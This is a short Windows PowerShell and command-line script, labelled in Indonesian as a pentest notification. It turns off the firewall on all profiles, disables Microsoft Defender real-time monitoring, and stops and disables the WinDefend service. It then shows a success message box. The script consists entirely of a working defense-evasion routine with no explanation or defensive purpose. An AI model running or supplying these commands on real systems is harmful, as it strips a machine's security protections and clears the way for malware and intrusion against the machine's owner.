netsh advfirewall set allprofiles state off

Set-MpPreference -DisableRealtimeMonitoring $true

sc stop WinDefend
sc config WinDefend start= disabled

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "Notifikasi Pentest", 'OK', 'Information')
